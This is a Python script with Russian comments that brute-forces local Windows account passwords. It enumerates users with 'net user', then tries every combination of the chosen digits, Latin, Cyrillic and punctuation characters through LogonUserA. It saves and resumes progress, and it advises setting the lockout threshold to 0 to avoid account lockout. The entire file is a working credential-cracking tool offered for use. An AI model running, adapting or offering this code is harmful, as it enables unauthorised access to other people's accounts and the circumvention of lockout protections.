import ctypes
import win32security
import subprocess
import win32api
import itertools
import string
import time
import json
import os
import sys

import logo

print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!")


user_list = []
def list_users():
    try:
        # Выполняем команду net user
        result = subprocess.run(['net', 'user'], capture_output=True, text=True, check=True, encoding="866")
        # Выводим результат
        print(result.stdout)
        res = result.stdout.strip().split("\n")
        for re in res:
            accounts = re.split()
            user_list.extend(accounts)

    except subprocess.CalledProcessError as e:
        print(f"Ошибка при выполнении команды: {e}")

list_users()

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

russian_letters = 'абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'

characters = ''

progress_file = "progress.json"

digits_progress = 0
ascii_progress = 0
russian_letter_progress = 0
punc_progress = 0

# Функция для сохранения прогресса
def save_progress(length, try_id, tryed):
    with open(progress_file, 'w', encoding="cp1251") as f:
        json.dump(
            {"account": account,
                   'digits': digits_progress,
                   "ascii": ascii_progress,
                   "russian_letter": russian_letter_progress,
                   "punctuation": punc_progress,
                   'characters': characters,
                   'length': length,
                   'try_id': try_id,
                   'tryed': tryed
             },
                  f,
                  indent=4
                  )

# Функция для загрузки прогресса
def load_progress():
    try:
        if os.path.exists(progress_file):
            with open(progress_file, 'r', encoding="cp1251") as f:
                return json.load(f)
        else:
            if not os.path.isfile(progress_file):
                # Если файл не существует, создаем его с пустым объектом
                with open(progress_file, 'w') as f:
                    json.dump({}, f)  # Записываем пустой объект в файл
                print(f"Файл '{progress_file}' был создан.")

    except FileNotFoundError:
        print("Файл 'progress.json' не найден.")
        return None
    except json.JSONDecodeError as e:
        print(f"Ошибка декодирования JSON: {e}")
        return None
    return None

# Загрузка прогресса
progress = load_progress()
if progress:
    account = progress['account']
    i = progress['length']
    try_id = progress['try_id']
    tryed = progress['tryed']
    characters = progress['characters']
else:
    i = 1
    try_id = 0
    tryed = []
    # Указываем имя пользователя и пароль
    while True:
        account = str(input("Введите имя учетной записи: "))
        if account in user_list:
            print("Учетная запись найдена")
            break
        else:
            print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")


    level = 0
    req_types = ["Вы хотите использовать числа для подбора: ( Y/n ) ",
                 "Вы хотите использовать латинские буквы для подбора: ( Y/n ) ",
                 "Вы хотите использовать кириллицу для подбора: ( Y/n ) ",
                 "Вы хотите использовать специальные символы для подбора: ( Y/n ) "]



    while True:

        if level == 4:
            break
        level += 1
        digits = str(input(f"{req_types[level - 1]}: "))
        if digits.lower() in ["y", "д"]:
            if level == 1:
                characters += string.digits
                digits_progress += 1
            if level == 2:
                characters += string.ascii_letters
                ascii_progress += 1
            if level == 3:
                characters += russian_letters
                russian_letter_progress += 1
            if level == 4:
                characters += string.punctuation
                punc_progress += 1
        elif digits.lower() in ["n", "н"]:
            pass
        else:
            print("Вы неправильно ввели, а нужно ( y / n )!")
            level -= 1

username = account  # Замените на ваше имя пользователя

found = False
time_start = int(time.time())
try:
    while not found:
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)
            if not password in tryed:
                try_id += 1
                # Попытка входа в систему
                token = ctypes.c_void_p()
                result = ctypes.windll.advapi32.LogonUserA(
                    username.encode('utf-8'),
                    None,  # Укажите домен, если необходимо
                    password.encode('utf-8'),
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    ctypes.byref(token)
                )

                if result:
                    print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                    found = True
                    break
                else:
                    print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                    tryed.append(password)
                    if win32api.GetLastError() == 1909:
                        print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                        sys.exit()

                # Сохраняем прогресс после каждой попытки
                save_progress(i, try_id, tryed)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1

except KeyboardInterrupt:

    save_progress(i, try_id, tryed)
    print("Программа прервана. Прогресс сохранен.")

except Exception as ex:
    print("Произошла ошибка: ", ex)

time_finish = int(time.time() - time_start)
print(f"{time_finish} секунд(ы)")


